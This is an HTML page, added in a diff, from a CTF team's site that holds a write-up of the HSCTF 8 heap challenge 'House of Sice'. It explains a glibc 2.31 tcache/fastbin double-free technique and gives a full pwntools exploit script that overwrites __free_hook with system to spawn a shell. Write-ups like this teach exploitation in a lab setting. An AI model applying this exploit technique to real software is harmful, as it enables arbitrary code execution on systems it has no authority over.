@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>PeanutButter.jar</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="../assets/img/favicon.ico" rel="icon">
+  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <link href="../assets/css/style.css" rel="stylesheet">
+
+
+</head>
+
+<body>
+
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <img src="../assets/img/poopy.png" alt="" class="img-fluid rounded-circle">
+        <h1 class="text-light"><a href="index.html">PeanutButter.jar</a></h1>
+        <div class="text-center">
+          <br>
+          <a href="https://ctftime.org/team/78193" class="text"> Our CTFTime (click here)</a>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="../index.html#hero" class="nav-link scrollto active"><i class="bx bx-home"></i> <span>Home</span></a></li>
+          <li><a href="../index.html#descriptions" class="nav-link scrollto"><i class="bx bx-user"></i> <span>Meet the Team</span></a></li>
+          <li><a href="../index.html#events" class="nav-link scrollto"><i class="bx bx-server"></i> <span>Upcoming Events</span></a></li>
+          <li><a href="../index.html#writeups" class="nav-link scrollto"><i class="bx bx-envelope"></i> <span>Writeups</span></a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+
+  <main id="main">
+
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Writeups</h2>
+          <ol>
+            <li><a href="../index.html">Home</a></li>
+            <li>Writeups</li>
+          </ol>
+        </div>
+
+      </div>
+    </section>
+
+    <section id="portfolio-details" class="portfolio-details">
+      <div class="container">
+          <div class="col-lg-20">
+            <div class="portfolio-info">
+              <h3>Writeup For: House of Sice HSCTF 8</h3>
+            </div>
+            <div class="portfolio-description">
+              <br>
+              <p>
+              This problem boils down to being able to double free a fastbin-sized chunk in a limitted number of mallocs plus
+              a single calloc, while also having to deal with the tcache double free check in libc-2.31. If it weren't for the
+              limitted mallocs, one could fill the tcache bin, double free the fastbins, empty the tcache bin, and finish the
+              double free on fastbins as normal. However, this would take 7 + 2 + 7 + 3 = 20 allocations. To get around this,
+              we can instead to perform a double free by abusing the fact fast and tcache bins have different double free checks.
+              First, fill the tcache bin and add and free a fastbin chunk. Next, add back a tcache bin and also place the fastbin 
+              chunk into tcache. It will not detect double free as the code for freeing tcache is executed first, then exits the
+              free function immediately. Now, here's where the calloc comes into play. While tcache normally has allocation
+              priority over fastbins, calloc cannot allocate tcache, allowing you to allocate a fastbin on the next allocation.
+              You can then overwrite the pointer to where the next tcache bin is allocated, allowing you to add two more chunks
+              to get an arbitrary allocation, so you can overwrite freehook with system and win. This take in a total number of
+              allocations 7 + 1 + 1 + 3 = 12, which is well below the 16 limit.
+              </p>
+              <code style="white-space: pre-line;"> 
+
+              from pwn import *
+
+              #init
+
+              e = ELF('./sice')
+              libc = ELF('./libc-sice.so')
+
+              #p = process(e.path)
+              p = remote('house-of-sice.hsc.tf', 1337)
+
+              #funcs
+
+              def add(x, y = 0):
+                  p.sendlineafter('>', '1')
+                  p.sendlineafter('>', str(x))
+                  p.sendlineafter('>', str(y))
+
+              def fre(x):
+                  p.sendlineafter('>', '2')
+                  p.sendlineafter('>', str(x))
+
+              #vars
+
+              freehook_off = libc.sym['__free_hook']
+              system_off = libc.sym['system']
+
+              log.info('Freehook libc off: ' + hex(freehook_off))
+              log.info('System libc off: ' + hex(system_off))
+
+              #exploit
+
+              #get given libc
+
+              p.recvuntil('deet: ')
+
+              libc_off = int(p.recvline(keepends = False), 16) - system_off
+
+              log.info('Libc off adr: ' + hex(libc_off))
+
+              #fill up tcache and add bin to to fastbin list
+
+              for i in range(8):
+                  add(1)
+
+              for i in reversed(range(8)):
+                  fre(i)
+
+              #now remove one bin from tcache and add the fastbin into tcache too
+
+              add(1)
+
+              fre(0)
+
+              #now you can overwrite pointer with calloc from fastbin list to point tcache to overwrite freehook
+
+              add(2, libc_off + freehook_off)
+              add(1, u64(b'/bin/sh\x00'))
+
+              #overwrite freehook with system
+
+              add(1, libc_off + system_off)
+
+              #call system('/bin/sh')
+
+              fre(0)
+
+              #pray for flag
+
+              p.interactive()
+
+            </code>
+            </div>
+          </div>
+      </div>
+    </section>
+
+  </main>
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <script src="../assets/vendor/aos/aos.js"></script>
+  <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="../assets/vendor/php-email-form/validate.js"></script>
+  <script src="../assets/vendor/purecounter/purecounter.js"></script>
+  <script src="../assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="../assets/vendor/typed.js/typed.min.js"></script>
+  <script src="../assets/vendor/waypoints/noframework.waypoints.js"></script>
+
+
+  <script src="../assets/js/main.js"></script>
+
+</body>
+
+</html>
